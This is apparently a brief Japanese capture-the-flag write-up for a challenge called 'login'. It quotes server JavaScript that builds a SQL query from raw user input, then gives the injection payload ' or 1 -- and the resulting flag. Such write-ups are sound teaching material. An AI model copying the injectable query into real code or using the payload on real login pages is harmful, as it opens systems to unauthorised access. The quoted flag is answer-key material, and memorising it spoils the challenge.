# login

以下はサーバーのソースコードの一部
```javascript
    try {
        result = db.prepare(`SELECT * FROM users
            WHERE username = '${username}'
            AND password = '${password}';`).get();
    } catch (error) {
        res.json({ success: false, error: "There was a problem." });
        res.end();
        return;
    }

    if (result) {
        res.json({ success: true, flag: process.env.FLAG });
        res.end();
        return;
    }
```

SQL injectionの脆弱性がある
PASSWORDに`' or 1 --`と入力すると`flag{0bl1g4t0ry_5ql1}`と表示された
